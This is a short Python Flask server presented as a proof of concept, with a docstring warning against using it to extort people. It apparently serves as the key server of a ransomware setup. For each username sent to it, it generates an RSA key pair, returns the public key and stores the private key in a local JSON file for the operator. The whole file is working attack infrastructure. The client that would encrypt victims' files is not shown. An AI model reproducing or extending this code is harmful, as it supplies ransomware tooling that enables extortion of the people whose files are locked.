"""
This is a proot-of-concept I made.
Please do not use this to extort people, it is your responsibility to obey the law.
"""


from flask import Flask, request, jsonify
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import json

app = Flask(__name__)
CLIENT_KEYS_FILE = "client_keys.json"
clients = {}

@app.route("/ping")
def ping():
    return "OK", 200

@app.route("/get_public_key", methods=["POST"])
def get_public_key():
    username = request.form.get("username")
    if not username:
        return "No username provided", 400

    # Generate key pair
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    # Serialize public key
    public_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    # Save keys
    clients[username] = {
        "public_key": public_bytes.decode(),
        "private_key": private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()
    }

    with open(CLIENT_KEYS_FILE, "w") as f:
        json.dump(clients, f, indent=4)

    print(f"[HOST] Sent public key to {username}")
    return public_bytes, 200

if __name__ == "__main__":
    print("Server running on http://127.0.0.1:5446")
    app.run(host="0.0.0.0", port=5446)